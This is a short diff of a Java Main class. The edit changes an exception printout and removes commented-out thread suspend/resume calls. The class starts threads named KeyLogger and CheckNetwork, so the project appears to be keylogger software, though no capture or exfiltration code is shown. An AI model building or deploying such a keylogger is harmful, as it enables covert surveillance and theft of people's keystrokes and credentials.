@@ -11,14 +11,11 @@ public class Main{
             t1.start();
             t1.join();
         }catch(Exception e){
-            System.out.println(e.getMessage());
+            System.out.println(e);
         }
         KeyLogger kl = new KeyLogger(re);
         Thread t2 = new Thread(kl);
         t2.start();
-
-        // t2.suspend();
-        // t2.resume();
         CheckNetwork cn = new CheckNetwork(re);
         Thread t = new Thread(cn);
         t.start();
